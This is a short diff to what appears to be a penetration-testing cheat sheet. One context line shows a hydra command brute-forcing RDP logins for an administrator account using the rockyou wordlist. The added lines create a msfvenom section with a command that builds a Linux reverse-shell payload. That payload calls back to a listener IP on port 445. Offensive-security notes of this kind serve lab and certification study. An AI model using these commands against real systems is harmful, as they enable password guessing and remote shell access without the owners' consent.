@@ -2834,3 +2834,7 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
 
 ```
+#MSFVENOM
+
+# Linux reverse shell
+	msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.exe LHOST=192.168.45.246 LPORT=445
